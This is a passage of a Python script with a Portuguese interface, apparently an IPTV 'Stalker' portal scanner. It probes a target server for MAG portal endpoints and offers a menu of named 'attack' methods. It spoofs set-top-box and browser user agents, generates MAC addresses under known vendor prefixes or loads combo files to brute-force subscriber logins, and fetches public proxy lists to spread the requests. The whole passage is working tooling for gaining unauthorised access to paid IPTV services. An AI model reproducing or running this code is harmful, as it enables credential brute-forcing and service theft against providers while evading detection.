        uzmanm = 'stalke.php'
        albstb2 = '➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'stalker.php⁽ˣᵁᴵ³⁾'
        pano = '/stalke'
        uzmanmz = 'atack'
        agentx = 'Mᴀɢ266-Sᴛᴀʟᴋᴇʀ:533'
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3'
    if phhp == '60':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = '775GGbszy.php'
        albstb2 = '➚⁽ˢˢ⁾'
        albstb3 = 'stalker77.php⁽ˢˢ⁾'
        uzmanmz = 'atack'
    if phhp == '61':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = '/play/integration/stalker'
        albstb2 = '/p/i/s➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'p/i/stalker.php⁽ˣᵁᴵ³⁾'
        uzmanmz = 'atack'
    if phhp == '62':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        uzmanmc = 'realblue'
        albstb2 = '➚⁽ᴿᵉᵃˡᴮˡᵘᵉ⁾'
        albstb3 = 'realblue.php⁽ᴮˡᵘᵉ⁾'
if phhp == '99':
    uzmanm = str(phpdata)
    attack = 'IPv³ᴀᴜᴛᴏ-ᴀᴛᴛᴀᴄᴋ'
    agentx = 'IPv³ᴀᴜᴛᴏ-ᴀɢᴇɴᴛX'
    if 'stalker_portal' in panel:
        uzmanmc = 'realblue'
    if 'c/' in uzmanm:
        agentx = 'IPv³ᴀᴜᴛᴏ-ᴀɢᴇɴᴛC⁵'
    albstb3 = 'ᴀᴜᴛᴏᴍᴀᴛɪᴄ.ᴘʜᴘ⁽IPv³⁾'
    albstb2 = '/ᴀᴜᴛᴏ➚⁽IPv³⁾'
    uzmanmz = 'atack'
    useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02'
if ssx in panel:
    ss = ssx
else:
    ss = ss
os.system("cls" if os.name == "nt" else "clear")
print(PRL)
print('\x1b[0m')
os.system("cls" if os.name == "nt" else "clear")
panel = panel0
if not "http://" in panel:
    panel = "http://" + panel
ban=""
uzmanm="portal.php"
realblue=""
http="http"
fsp = panel
dizisayisi = filmsayisi = kanalsayisi = 0
mt = xtream = ""
ban = ""
domain = ""
panelnoport = ""
portalloadlist = []
Ualist = []
dizisayisi = filmsayisi = kanalsayisi = 0
panel = panel.replace("http://", "")
panel = panel.replace("/c/", "")
panel = panel.replace("/c", "")
panel = panel.replace("/", "")
panel = panel.replace('stalker_portal', '/stalker_portal')
domain = panel
if ":" in panel:
    port = panel.split(':')[1]
    panelnoport = panel.split(':')[0]
else:
    panelnoport = domain
user_agents_list = [
     'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
     'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)',
     'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
     'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
     'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; Nautilus/1.0Final) Gecko/20020408',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
     'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
     'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [ip:127.0.0.1:80]',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'
     'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Cloudflare-AMPHTML)'
     'Mozilla/5.0 (Linux; U; Android 4.2.2; pt-; HP 8 Build/1.0.7_WW-FIR-13) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30'
     'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36'
        ]
portalload = [
     '/portal.php', '/server/load.php', '/stalker_portal/server/load.php', '/c/portal.php', '/c/server/load.php',
     '/magaccess/portal.php', '/portalcc.php', '/bs.mag.portal.php', '/magportal/portal.php', '/maglove/portal.php',
     '/tek/server/load.php', '/emu/server/load.php','/emu2/server/load.php', '/ghandi_portal/server/load.php',
     '/magLoad.php', '/ministra/portal.php', '/portalstb/portal.php', '/xx/portal.php', '/portalmega.php',
     '/portalmega/portal.php', '/rmxportal/portal.php','/portalmega/portalmega.php','/powerfull/portal.php',
     '/korisnici/server/load.php', '/nettvmag/portal.php', '/cmdforex/portal.php', '/k/portal.php', '/p/portal.php',
     '/cp/server/load.php', '/extraportal.php', '/Link_Ok/portal.php', '/delko/portal.php', '/delko/server/load.php',
     '/bStream/portal.php', '/bStream/server/load.php', '/blowportal/portal.php', '/client/portal.php','/server/move.php',
            ]
os.system("cls" if os.name == "nt" else "clear")
StalkerElectronSpeedX()
print("\n\33[1;38;5;215m Varredura Automática do Portal, por favor aguarde...")
for verifiedload in portalload:
    try:
        agent = random.choice(user_agents_list)
        getrequest = ses.get(fsp + verifiedload, headers={'User-Agent': agent}, timeout=15, verify=False)
    except requests.exceptions.ConnectionError:
        status_code = "Conexão recusada"
        print(status_code)
        input()
        quit()
    time.sleep(0.00)
    statuscode = getrequest.status_code
    time.sleep(0.00)
    if statuscode == int(200):
        portalloadlist.append(verifiedload)
        Ualist.append(agent)
    else:
        pass
uzmanm = 1
host = panel
print("\33[1;96m\nTipos de Portais Disponíveis\n\33[0;97m")
paneldetails = []
i = 1
for host in portalloadlist:
    paneldetails.append(host)
    print(f"\n\33[1;38;5;2m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\33[1;38;5;3m★    \n\33[1;38;5;2m┃\33[1;38;5;3m {i}. {host}\n\33[1;38;5;2m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\33[1;38;5;3m★    ")
    i += 1
try:
    portaltype = int(input("\33[1;96m\nEscolha o tipo de escaneamento do portal = \33[0;97m"))
    uzmanm = portalloadlist[portaltype - 1]
except:
        if uzmanm == 1:
            uzmanm = "/portal.php"
        print(uzmanm)
        time.sleep(4)
os.system("cls" if os.name == "nt" else "clear")
infophpx = ''
if not infophp == '':
    infophpx = """
\033[1;93m│╰─  \033[38;5;003mDᴇʙᴜɢɢɪɴɢ:[91m""" + str(infophp) + '\x1b[91m' + str(vrdata) + ' \x1b[0m'
if uzmanmz == 'atack':
    atack = input("""[0m    [1;40mEscolha o Método de Ataque! [0m
    [33mᴘᴀʀᴀ ᴘᴀᴅʀᴀ̃ᴏ ʙᴀsᴛᴀ ᴘʀᴇssɪᴏɴᴀʀ ⫸ ᴇɴᴛᴇʀ [0m
    0 [1;32m=⫸ [0m [33mIPv³Mᴀx-SS-Aᴛᴛᴀᴄᴋ [0m
    1 [1;32m=⫸ [0m [33mIPv³Pʀᴏ-SP-Aᴛᴛᴀᴄᴋ [0m
    2 [1;32m=⫸ [0m [33mUʟᴛʀᴀ-SP-Aᴛᴛᴀᴄᴋ [0m
    3 [1;32m=⫸ [0m [33mGᴏʟᴅ-SS-Aᴛᴛᴀᴄᴋ [0m
    4 [1;32m=⫸ [0m [33mCʟᴏᴜᴅ-SP-Aᴛᴛᴀᴄᴋ [0m
    5 [1;32m=⫸ [0m [33mGʜᴏsᴛ-SS-Aᴛᴛᴀᴄᴋ [0m
    6 [1;32m=⫸ [0m [33mAᴛᴏᴍ-RL-Aᴛᴛᴀᴄᴋ [0m
    7 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-SS-Aᴛᴛᴀᴄᴋ [0m
    8 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-XX-Aᴛᴛᴀᴄᴋ [0m
    9 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-SN-Aᴛᴛᴀᴄᴋ [0m
   10 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-ID-Aᴛᴛᴀᴄᴋ [0m
   11 [1;32m=⫸ [0m [33mSᴛᴀʟᴋᴇʀ-RB-Aᴛᴛᴀᴄᴋ [0m
   [40mRᴇsᴘᴏsᴛᴀ =[0m[31m[31m[31m """)
    if atack == '':
        os.system("cls" if os.name == "nt" else "clear")
        if phhp == '99':
            attack = 'IPv³ᴀᴜᴛᴏ-ᴀᴛᴛᴀᴄᴋ'
        else:
            attack = 'IPv³-Mᴀx-Aᴛᴛᴀᴄᴋ'
    if atack == '0':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanmc = 'ultra'
        if 'server/load.php' in uzmanm:
            uzmanmc = 'stalker_ss'
            attack = 'IPv³Mᴀx-ss-Aᴛᴛᴀᴄᴋ'
        else:
            attack = 'IPv³Mᴀx-ᴘᴘ-Aᴛᴛᴀᴄᴋ'
    if atack == '1':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanmc = 'stbpro'
        if 'server/load.php' in uzmanm:
            attack = 'IPv³Pʀᴏ-Aᴛᴛᴀᴄᴋ-S'
        else:
            attack = 'IPv³Pʀᴏ-Aᴛᴛᴀᴄᴋ-P'
    if atack == '2':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanmc = 'ultra'
        if 'server/load.php' in uzmanm:
            attack = 'Uʟᴛʀᴀ-Aᴛᴛᴀᴄᴋ-S'
        else:
            attack = 'Uʟᴛʀᴀ-Aᴛᴛᴀᴄᴋ-P'
    if atack == '3':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanmc = 'xgold'
        if 'server/load.php' in uzmanm:
            attack = 'Gᴏʟᴅ-Aᴛᴛᴀᴄᴋ-S'
        else:
            attack = 'Gᴏʟᴅ-Aᴛᴛᴀᴄᴋ-P'
    if atack == '4':
        os.system("cls" if os.name == "nt" else "clear")
        agent = '22'
        uzmanmc = 'cloudflarex'
        albstb3 = 'automatic.php⁽ᶜˡᵒᵘᵈ⁾'
        useragent = 'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34'
        if 'server/load.php' in uzmanm:
            attack = 'CʟᴏᴜᴅFʟᴀʀᴇ-PᴀsS'
        else:
            attack = 'CʟᴏᴜᴅFʟᴀʀᴇ-Pᴀss'
    if atack == '5':
        os.system("cls" if os.name == "nt" else "clear")
        if uzmanm == 'stalker_portal/server/load.php':
            uzmanmc = 'stalker_ss'
            attack = 'Gʜᴏsᴛ-Aᴛᴛᴀᴄᴋ-SS'
        if uzmanm == 'server/load.php':
            uzmanmc = 'ultra'
            attack = 'Gʜᴏsᴛ-Aᴛᴛᴀᴄᴋ-S'
        else:
            uzmanmc = 'stbpro'
            attack = 'Gʜᴏsᴛ-Aᴛᴛᴀᴄᴋ-P'
    if atack == '6':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanmc == 'realblue'
        if 'server/load.php' in uzmanm:
            attack = 'Aᴛᴏᴍ-Aᴛᴛᴀᴄᴋ-S'
        else:
            attack = 'Aᴛᴏᴍ-Aᴛᴛᴀᴄᴋ-P'
        useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02'
    if atack == '7':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanmc = 'ultra'
        if 'server/load.php' in uzmanm:
            uzmanmc = 'stalker_ss'
            attack = 'Sᴛᴀʟᴋᴇʀ-SS-Aᴛᴛᴀᴄᴋ'
        else:
            attack = 'Pᴏʀᴛᴀʟ-SS-Aᴛᴛᴀᴄᴋ'
    if atack == '8':
        os.system("cls" if os.name == "nt" else "clear")
        if 'server/load.php' in uzmanm:
            uzmanmc = 'stalker'
            attack = 'Sᴛᴀʟᴋᴇʀ-XX-Aᴛᴛᴀᴄᴋ'
        else:
            attack = 'Host is not a Stalker!'
    if atack == '9':
        os.system("cls" if os.name == "nt" else "clear")
        if 'server/load.php' in uzmanm:
            uzmanmc = 'stalker_portal'
            attack = 'Sᴛᴀʟᴋᴇʀ-SN-Aᴛᴛᴀᴄᴋ'
        else:
            attack = 'Host is not a Stalker!'
    if atack == '10':
        os.system("cls" if os.name == "nt" else "clear")
        if 'server/load.php' in uzmanm:
            uzmanmc = 'stalker_portal_1'
            attack = 'Sᴛᴀʟᴋᴇʀ-ID-Aᴛᴛᴀᴄᴋ'
        else:
            attack = 'Host is not a Stalker!'
    if atack == '11':
        os.system("cls" if os.name == "nt" else "clear")
        if 'server/load.php' in uzmanm:
            uzmanmc = 'stalker_portal_2'
            attack = 'Sᴛᴀʟᴋᴇʀ-RB-Aᴛᴛᴀᴄᴋ'
        else:
            attack = 'Host is not a Stalker!'
print('\x1b[0m')
if useragent == '':
    os.system("cls" if os.name == "nt" else "clear")
    agent = input("""[0m    [1;40mEscolha o Agente para Emular! [0m
    [33mᴀɢᴇɴᴛᴇ ᴘᴀᴅʀᴀ̃ᴏ = 2 [0m
    0 [1;32m=⫸ [0m [33mᴄᴜsᴛᴏᴍ xᴀɢᴇɴᴛ [0m
    1 [1;32m=⫸ [0m [33mᴜʟᴛʀᴀ ᴍᴀᴛʀɪx [0m
    2 [1;32m=⫸ [0m [33mɴɪɴᴊᴀ xᴜʟᴛʀᴀ [0m
    3 [1;32m=⫸ [0m [33mʙᴏx ʀᴏᴋᴜ:ɢᴏʟᴅ [0m
    4 [1;32m=⫸ [0m [33mʙᴏx ʀᴏᴋᴜ:ᴜʟᴛʀᴀ [0m
    5 [1;32m=⫸ [0m [33mɢʟᴇ ᴀᴅᴛʙᴏx [0m
    6 [1;32m=⫸ [0m [33mɢʟᴇ ɴᴇxʙᴏx [0m
    7 [1;32m=⫸ [0m [33mᴍᴀɢ4:1812 [0m
    8 [1;32m=⫸ [0m [33mᴍᴀɢ4:2721 [0m
    9 [1;32m=⫸ [0m [33mᴍᴀɢ6:ᴀᴜᴛᴏ [0m
   10 [1;32m=⫸ [0m [33mᴍᴀɢ2:250 [0m
   11 [1;32m=⫸ [0m [33mᴍᴀɢ2:ᴀᴜᴛᴏ [0m
   12 [1;32m=⫸ [0m [33mᴍᴀɢ4:ᴀᴜᴛᴏ [0m
   13 [1;32m=⫸ [0m [33mᴍᴀɢ4:ᴀᴜᴛᴏ [0m
   14 [1;32m=⫸ [0m [33mᴀᴍᴀ4ᴋ ғɪʀᴇ [0m
   15 [1;32m=⫸ [0m [33mᴀᴘᴘʟᴇ 5ᴛʜ 4ᴋ [0m
   16 [1;32m=⫸ [0m [33mᴀᴘᴘʟᴇ 6ᴛʜ 4ᴋ [0m
   17 [1;32m=⫸ [0m [33mʙᴏx ᴄʜʀᴏᴍᴇ31 [0m
   18 [1;32m=⫸ [0m [33mʙᴏx sᴛᴀᴛ2.26 [0m
   19 [1;32m=⫸ [0m [33mʙᴏx ᴠɪᴛᴀ3.61 [0m
   20 [1;32m=⫸ [0m [33mxʙᴏx sᴇʀ2023 [0m
   21 [1;32m=⫸ [0m [33mᴍᴏᴢ ʜᴛᴛᴘs64 [0m
   22 [1;32m=⫸ [0m [33mᴄʟᴏᴜᴅғʟᴀʀᴇ-ɢᴇɴ [0m
   23 [1;32m=⫸ [0m [33mᴄʜʀᴏᴍᴇ ᴏᴋʜᴛᴛᴘx [0m
   [40mRᴇsᴘᴏsᴛᴀ =[0m[31m[31m[31m """)
    if agent == '':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02'
        agentx = 'Cᴜsᴛᴏᴍ-Aɢᴇɴᴛ-IPv³5'
    if agent == '0':
        useragent = input(' Write Custom Agent = \x1b[0m')
        agentx = 'Cᴜsᴛᴏᴍ-xAɢᴇɴᴛ'
        print(' ' + useragent + '\n')
    if agent == '1':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Roku/DVP-9.10 (559.10E04111A)'
        agentx = 'Uʟᴛʀᴀ-Mᴀᴛʀɪx'
    if agent == '2':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02'
        agentx = 'Nɪɴᴊᴀ-Xᴜʟᴛʀᴀ'
    if agent == '3':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Roku/DVP-9.10 (559.10E04111A)'
        agentx = 'BᴏxRᴏᴋᴜ:Gᴏʟᴅ'
    if agent == '4':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Roku4640X/DVP-7.70 (297.70E04154A)'
        agentx = 'BᴏxRᴏᴋᴜ:Uʟᴛʀᴀ'
    if agent == '5':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002)'
        agentx = 'Gʟᴇ-ᴀᴅᴛBᴏx'
    if agent == '6':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)'
        agentx = 'Gʟᴇ-ɴᴇxBᴏx'
    if agent == '7':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3'
        agentx = 'Mᴀɢ4:1812'
    if agent == '8':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3'
        agentx = 'Mᴀɢ4:2721'
    if agent == '9':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 6 rev: c8a6f17 Mobile Safari/533.3'
        agentx = 'Mᴀɢ6:Aᴜᴛᴏ'
    if agent == '10':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'
        agentx = 'Mᴀɢ2:250'
    if agent == '11':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: ' + str(random.randint(999, 9999)) + ' Mobile Safari/533.3'
        agentx = 'Mᴀɢ2:Aᴜᴛᴏ'
    if agent == '12':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: ' + str(random.randint(999, 9999)) + ' Mobile Safari/533.3'
        agentx = 'Mᴀɢ4:Aᴜᴛᴏ'
    if agent == '13':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG350 stbapp ver: 4 rev: ' + str(random.randint(999, 9999)) + ' Mobile Safari/533.3'
        agentx = 'Mᴀɢ3:Aᴜᴛᴏ'
    if agent == '14':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36'
        agentx = 'Aᴍᴀ4ᴋ-Fɪʀᴇ'
    if agent == '15':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'AppleTV6,2/11.1'
        agentx = 'Aᴘᴘʟᴇ-5ᴛʜ-4ᴋ'
    if agent == '16':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'AppleTV11,1/11.1'
        agentx = 'Aᴘᴘʟᴇ-6ᴛʜ-4ᴋ'
    if agent == '17':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36'
        agentx = 'Bᴏx-Cʜʀᴏᴍᴇ31'
    if agent == '18':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15'
        agentx = 'Bᴏx-Sᴛᴀᴛ2.26'
    if agent == '19':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2'
        agentx = 'Bᴏx-Vɪᴛᴀ3.61'
    if agent == '20':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02'
        agentx = 'xBᴏx-Sᴇʀ2023'
    if agent == '21':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'
        agentx = 'Mᴏᴢ-ʜᴛᴛᴘs64'
    if agent == '22':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34'
        uzmanmc = 'cloudflarex'
        agentx = 'CʟᴏᴜᴅFʟᴀʀᴇ-Gᴇɴ'
    if agent == '23':
        os.system("cls" if os.name == "nt" else "clear")
        useragent = 'okhttp/4.7.1'
        agentx = 'Cʜʀᴏᴍᴇ-ᴏᴋʜᴛᴛᴘx'
print('\x1b[0m')
os.system("cls" if os.name == "nt" else "clear")
dosyaadi=panel.replace(":","_")
def temizle():
    print("\n\033[38;5;003m                ESCOLHA O TIPO DE MAC          \33[0m\n")
yeninesil = (
    '00:1A:79:',
    '00:1B:79:',
    '00:1C:19:',
    '00:2A:79:',
    '00:A1:79:',
    '04:D6:AA:',
    '10:27:BE:',
    '11:33:01:',
    '1A:00:6A:',
    '1A:00:FB:',
    '33:44:CF:',
    '55:93:EA:',
    'A0:BB:3E:',
    'D4:CF:F9:',
)
comboc=""
combototLen=""
combouz=0
combodosya= '\33[1;96m AUTO COMBO '
proxyc=""
proxytotLen=""
proxydosya=""
proxyuz=0
statusproxy=""
proxylist=""
try:
    codeserv3 = veri3.split('country_code":"')[1]
except NameError:
    print("veri3 não está definida. Verifique a inicialização de veri3.")
def dosyasec():
	global comboc,combototLen,proxyuz,proxydosya,combodosya,proxyc,proxytotLen,proxyuz,combouz,randomturu,serim,seri,mactur,randommu,statusproxy,comboinfo
	say=0
	dsy=""
	if comboc=="":
		mesaj="Por favor, escolha a combinação desejada para o arquivo referente ao combo."
		dir=rootDir+'/combo/'
		dsy = " \33[0;1m╠⚛︎  \33[1;38;5;215m[ \33[1;96m0 \33[1;38;5;215m] \33[0;1;105mᗰᗩᑕS ᗩᒪᕮᗩTÓᖇIO (OTO ᗰᗩᑕ)   \33[0;1m\n"
	else:
		mesaj="\33[0;1mPor favor, escolha a combinação desejada para o arquivo relacionado ao proxy."
		dir=rootDir+'/proxy/'
	if not os.path.exists(dir):
	    os.mkdir(dir)
	arquivos = sorted([files for files in os.listdir(dir) if files.endswith(".txt")])
	for files in arquivos:
	 	say=say+1
	 	dsy = dsy + " \33[0;1m╠⚛︎  \33[1;38;5;215m[ \33[1;96m" + str(say) + " \33[1;38;5;215m] \33[1;92m" + files + '\n'
	os.system("cls" if os.name == "nt" else "clear")
	print(PRL)
	print ("""\33[0;1m\nPor favor, selecione o seu arquivo de combo na lista abaixo para digitalização.\n\33[0;1m
 ╔════════════════════════════════════════☣                \33[0;1m
"""+dsy+"""\33[0;1m ╚════════════════════════════════════════☣
\33[33m\nNa sua pasta de combo, foram encontrados """ +str(say)+""" arquivos.
	""")
	dsyno=str(input("\33[1;38;5;229m"+mesaj+"\n\nNúmero do Combo =\33[0;1m "))
	say=0
	for files in arquivos:
		 say=say+1
		 if dsyno==str(say):
		 	dosya=(dir+files)
		 	break
	say=0
	try:
		 if not dosya=="":
		 	print(dosya)
		 else:
		 		temizle()
		 		print("\033[0;96mSeleção de combo inválida")
		 		quit()
	except:
		if comboc=="":
			if dsyno=="0" or dsyno=="":
				temizle()
				nnesil=str(yeninesil)
				nnesil=(nnesil.count(',')+1)
				for xd in range(0,(nnesil)):
		 			tire=' 》'
		 			if int(xd) <9:
		 				tire='  》'
		 			print(str(xd+1)+tire+yeninesil[xd])
				mactur=input("\033[0;96mEscolha o tipo de Mac!\n\nResposta =\033[0;94m ")
				if mactur=="":
		 			mactur=1
				randomturu=input("""\033[0;91mGerar MAC
 \33[33mMac em Cascata = \33[31m1
 \33[33mMac Aleatório = \33[31m2
\33[0m\33[1m Escolha o tipo =\33[31m """)
				if randomturu=="":
		 			randomturu="2"
				serim=""
				serim=input(""" \033[0;94m
\33[33mUsou o serial do Mac?\n
 \33[1m\33[34mSim (1) \33[0m ou \33[1m\33[32mNão (2) \33[0m
Resposta = """)
				mactur=yeninesil[int(mactur)-1]
				if serim =="1":
		 			seri=input("Amostra="+mactur+"\33[31m5\33[0m\nAmostra="+mactur+"\33[31mF\33[31mFa\33[32m\nEscreva um ou dois valores!\33[0m\n\33[1m"+mactur+"\33[31m")
				combouz=input("""\33[0m
Macs para escanear
Números de Mac=""")
				if combouz=="":
		 			combouz=16777216
				combouz=int(combouz)
				randommu="xdeep"
		else:
			temizle()
			print("\33[1;37;44mSeleção de arquivo incorreta...")
			quit()
	if comboc=="":
		if randommu=="":
			combodosya=dosya.replace(rootDir+'/combo/',"")
			combodosya=combodosya.replace('.txt',"")
			comboc=open(dosya, 'r', encoding='utf-8')
			combototLen=comboc.readlines()
			combouz=(len(combototLen))
		else:
			comboc='PRL'
	else:
			proxydosya=dosya
			proxyc=open(dosya, 'r', encoding='utf-8')
			proxytotLen=proxyc.readlines()
			proxyuz=(len(proxytotLen))
			statusproxy = ("""
 ╠   \33[1;96m"""+str(proxydosya)+"""\33[0m
 ╠   \33[1;32m"""+str(proxyuz)+"""\33[0m   """)
randommu=""
dosyasec()
https=["https://proxyspace.pro/https.txt",
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
          "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
          "https://api.openproxylist.xyz/http.txt",
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
		  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
		  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
		  "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
		  "https://www.proxy-list.download/api/v1/get?type=http",
		  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
		  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt",
